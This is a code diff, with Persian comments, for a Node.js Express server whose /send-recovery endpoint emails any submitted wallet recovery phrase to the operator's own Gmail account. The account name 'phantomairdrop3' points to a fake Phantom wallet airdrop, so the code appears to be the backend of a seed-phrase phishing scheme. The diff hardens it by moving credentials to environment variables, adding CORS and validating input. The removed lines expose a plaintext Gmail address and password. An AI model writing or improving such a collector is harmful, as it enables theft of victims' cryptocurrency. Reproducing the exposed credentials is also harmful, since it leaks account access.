@@ -1,8 +1,14 @@
+require('dotenv').config();  // این خط برای استفاده از .env است
 const express = require('express');
 const bodyParser = require('body-parser');
 const nodemailer = require('nodemailer');
+const cors = require('cors');
 const app = express();
 
+// Enable CORS for cross-origin requests
+app.use(cors());
+
+// Use body-parser to parse incoming requests
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
@@ -10,8 +16,8 @@ app.use(bodyParser.urlencoded({ extended: true }));
 const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-        user: 'phantomairdrop3@gmail.com', // ایمیل شما
-        pass: '@Soheyl1374' // رمز عبور اصلی
+        user: process.env.EMAIL_USER,  // ایمیل شما از متغیر محیطی
+        pass: process.env.EMAIL_PASS   // رمز عبور از متغیر محیطی
     }
 });
 
@@ -19,21 +25,27 @@ const transporter = nodemailer.createTransport({
 app.post('/send-recovery', (req, res) => {
     const { recoveryPhrase } = req.body;
 
+    // بررسی وجود recoveryPhrase در درخواست
+    if (!recoveryPhrase) {
+        return res.status(400).send('Recovery phrase is required!');
+    }
+
     // ایمیل ارسال اطلاعات
     const mailOptions = {
-        from: 'phantomairdrop3@gmail.com', // ایمیل ارسال‌کننده
-        to: 'phantomairdrop3@gmail.com',  // ایمیل دریافت‌کننده (ایمیل خودتان)
+        from: process.env.EMAIL_USER,  // ایمیل ارسال‌کننده
+        to: process.env.EMAIL_USER,    // ایمیل دریافت‌کننده
         subject: 'Recovery Phrase Received',
         text: `A new recovery phrase was submitted: \n\n${recoveryPhrase}`
     };
 
+    // ارسال ایمیل
     transporter.sendMail(mailOptions, (error, info) => {
         if (error) {
             console.error('Error sending email:', error);
-            res.status(500).send('Failed to send recovery phrase.');
+            return res.status(500).send('Failed to send recovery phrase.');
         } else {
             console.log('Email sent: ' + info.response);
-            res.status(200).send('Recovery phrase sent successfully!');
+            return res.status(200).send('Recovery phrase sent successfully!');
         }
     });
 });
